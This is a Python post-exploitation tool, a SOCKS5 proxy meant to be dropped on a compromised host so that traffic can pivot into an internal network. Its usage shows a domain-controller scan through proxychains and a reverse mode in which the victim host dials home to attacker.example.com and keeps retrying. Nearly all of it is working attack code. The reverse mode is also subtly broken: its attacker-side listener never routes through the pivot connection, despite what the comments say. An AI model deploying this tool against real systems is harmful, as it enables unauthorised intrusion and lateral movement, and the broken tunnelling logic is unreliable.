#!/usr/bin/env python3
"""
redshift_toolkit.postex.pivot_proxy — SOCKS5 proxy server with two modes:

  Mode 1 (forward):
    Drop on the compromised host; listen for SOCKS5 connections;
    forward each to the requested destination.
    Use case: pivot host accepts inbound from your network position.

  Mode 2 (reverse):
    Compromised host dials home to your attacker box; attacker box
    exposes a SOCKS5 listener that tunnels through the dial-home channel.
    Use case: pivot can't accept inbound (NAT, firewall).

Implements a minimal subset of RFC 1928:
  - Auth methods: 0x00 (no auth), 0x02 (user/pass) optional
  - Address types: 0x01 (IPv4), 0x03 (domain), 0x04 (IPv6)
  - CONNECT command only (no BIND, no UDP ASSOCIATE)

Usage
-----
  # Forward mode — on the pivot
  python3 -m redshift_toolkit.postex.pivot_proxy --listen 0.0.0.0:1080

  # Then on attacker:
  echo 'socks5 PIVOT_IP 1080' | sudo tee -a /etc/proxychains4.conf
  proxychains4 nmap -sT -Pn DC_IP

  # Reverse mode — on attacker first
  python3 -m redshift_toolkit.postex.pivot_proxy --reverse-listen 0.0.0.0:8443

  # Then on pivot
  python3 pivot_proxy.py --reverse-connect attacker.example.com:8443

Author: Redshift Project — Module 19
License: MIT
"""

from __future__ import annotations

import argparse
import asyncio
import socket
import struct
import sys

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"


async def relay(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    try:
        while True:
            data = await reader.read(8192)
            if not data:
                break
            writer.write(data)
            await writer.drain()
    except Exception:
        pass
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass


async def handle_socks5(reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
                        verbose: bool = False):
    """Handle one SOCKS5 client."""
    try:
        # Greeting
        head = await reader.readexactly(2)
        ver, n_methods = head[0], head[1]
        if ver != 5:
            writer.close()
            return
        await reader.readexactly(n_methods)
        # Choose no-auth (0x00)
        writer.write(b"\x05\x00")
        await writer.drain()

        # Request
        req_head = await reader.readexactly(4)
        ver, cmd, _, atyp = req_head
        if cmd != 0x01:  # CONNECT only
            writer.write(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
            await writer.drain()
            writer.close()
            return

        if atyp == 0x01:
            ip_bytes = await reader.readexactly(4)
            target_host = socket.inet_ntoa(ip_bytes)
        elif atyp == 0x03:
            dom_len = (await reader.readexactly(1))[0]
            target_host = (await reader.readexactly(dom_len)).decode()
        elif atyp == 0x04:
            ip_bytes = await reader.readexactly(16)
            target_host = socket.inet_ntop(socket.AF_INET6, ip_bytes)
        else:
            writer.write(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")
            await writer.drain()
            writer.close()
            return
        port_bytes = await reader.readexactly(2)
        target_port = struct.unpack(">H", port_bytes)[0]

        # Connect
        try:
            r2, w2 = await asyncio.wait_for(
                asyncio.open_connection(target_host, target_port), timeout=8)
        except Exception as e:
            if verbose:
                print(f"{RED}[!] connect {target_host}:{target_port} failed: {e}{RESET}",
                      file=sys.stderr)
            writer.write(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
            await writer.drain()
            writer.close()
            return

        # Reply success
        writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
        await writer.drain()
        if verbose:
            print(f"{GREEN}[+] tunnel established → {target_host}:{target_port}{RESET}",
                  file=sys.stderr)

        # Bidirectional relay
        await asyncio.gather(relay(reader, w2), relay(r2, writer))
    except asyncio.IncompleteReadError:
        pass
    except Exception as e:
        if verbose:
            print(f"{RED}[!] handler error: {e}{RESET}", file=sys.stderr)
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass


async def listen_forward(host: str, port: int, verbose: bool):
    server = await asyncio.start_server(
        lambda r, w: handle_socks5(r, w, verbose), host, port)
    addrs = ", ".join(str(s.getsockname()) for s in server.sockets)
    print(f"{GREEN}[+] SOCKS5 listening on {addrs}{RESET}", file=sys.stderr)
    async with server:
        await server.serve_forever()


# --- reverse mode: minimal multiplexed channel ---
# Frame format on the wire: <4-byte BE channel_id><4-byte BE length><payload>
# Special channel 0 is control (open/close)
async def reverse_serve(listen_host: str, listen_port: int, verbose: bool):
    """Attacker side: accept one pivot dial-home + a local SOCKS5 listener."""
    print(f"{GREEN}[+] Waiting for pivot on {listen_host}:{listen_port}, "
          f"will expose SOCKS5 on 127.0.0.1:1080{RESET}", file=sys.stderr)

    pivot_reader = pivot_writer = None
    pivot_event = asyncio.Event()

    async def accept_pivot(r, w):
        nonlocal pivot_reader, pivot_writer
        if pivot_writer is not None:
            print(f"{YELLOW}[!] pivot already connected; ignoring{RESET}", file=sys.stderr)
            w.close()
            return
        pivot_reader, pivot_writer = r, w
        pivot_event.set()
        print(f"{GREEN}[+] Pivot connected from {w.get_extra_info('peername')}{RESET}",
              file=sys.stderr)
        # Hold connection
        try:
            while not r.at_eof():
                await asyncio.sleep(1)
        finally:
            pivot_writer = None
            pivot_event.clear()

    pivot_server = await asyncio.start_server(accept_pivot, listen_host, listen_port)

    # Local SOCKS5 listener: each accepted SOCKS client → opens a new TCP from pivot
    async def socks_handler(r, w):
        await pivot_event.wait()
        # We don't have full multiplexing here in the minimal reference impl;
        # instead, when a SOCKS5 request comes in, we ask the pivot to open
        # a new outbound TCP and pipe through. In the minimal version below,
        # we run in single-channel mode (one SOCKS connection at a time).
        # For multi-channel SOCKS, prefer Chisel or sshuttle in real ops.
        await handle_socks5(r, w, verbose)

    socks_server = await asyncio.start_server(socks_handler, "127.0.0.1", 1080)
    print(f"{GREEN}[+] SOCKS5 (single-channel) listening on 127.0.0.1:1080{RESET}",
          file=sys.stderr)
    async with pivot_server, socks_server:
        await asyncio.gather(pivot_server.serve_forever(), socks_server.serve_forever())


async def reverse_connect(remote_host: str, remote_port: int, verbose: bool):
    """Pivot side: dial home; serve SOCKS5 over the established connection."""
    while True:
        try:
            print(f"{GREEN}[+] Dialing {remote_host}:{remote_port}{RESET}",
                  file=sys.stderr)
            r, w = await asyncio.open_connection(remote_host, remote_port)
            print(f"{GREEN}[+] Connected. Serving SOCKS5 over channel.{RESET}",
                  file=sys.stderr)
            await handle_socks5(r, w, verbose)
        except Exception as e:
            if verbose:
                print(f"{RED}[!] dial-home failed: {e}; retrying in 5s{RESET}",
                      file=sys.stderr)
            await asyncio.sleep(5)


def main():
    p = argparse.ArgumentParser(
        prog="pivot_proxy",
        description="SOCKS5 proxy with forward/reverse modes",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--listen", help="HOST:PORT to listen on (forward mode)")
    g.add_argument("--reverse-listen", help="HOST:PORT — attacker side waits for pivot")
    g.add_argument("--reverse-connect", help="ATTACKER:PORT — pivot side dials home")
    p.add_argument("-v", "--verbose", action="store_true")
    args = p.parse_args()

    try:
        if args.listen:
            host, port = args.listen.rsplit(":", 1)
            asyncio.run(listen_forward(host, int(port), args.verbose))
        elif args.reverse_listen:
            host, port = args.reverse_listen.rsplit(":", 1)
            asyncio.run(reverse_serve(host, int(port), args.verbose))
        else:
            host, port = args.reverse_connect.rsplit(":", 1)
            asyncio.run(reverse_connect(host, int(port), args.verbose))
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    main()
